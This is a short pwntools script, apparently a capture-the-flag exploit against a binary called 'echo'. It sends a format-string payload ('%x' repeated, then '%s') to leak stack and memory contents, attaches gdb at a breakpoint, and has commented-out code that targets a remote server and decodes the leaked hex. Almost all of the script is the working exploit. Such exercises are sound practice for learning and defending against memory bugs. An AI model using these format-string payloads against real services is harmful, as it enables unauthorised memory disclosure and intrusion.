#!/usr/bin/python3

from pwn import *

context.log_level = "debug"
context.arch = "i386"

r = process("./echo")

# 总思路就是先找要泄露的在哪，然后用对应的方式打印出来
# r = remote("124.16.75.117", 51004)

# payload = b"%08x|" * 10
payload = b"%x " * 8 + b"%s "

gdb.attach(r, "b*0x804871e")

r.sendlineafter(b"> ", payload)
# text = r.recvuntil(b"\n")[:-1]
# text = text.decode("utf-8").strip()
# # decode text every byte to ASCII
# ascii_text = "".join(
#     chr(int(text[i : i + 2], 16))
#     for i in range(0, len(text), 2)
#     if text[i : i + 2].isalnum()
# )
# print(ascii_text)


r.interactive()
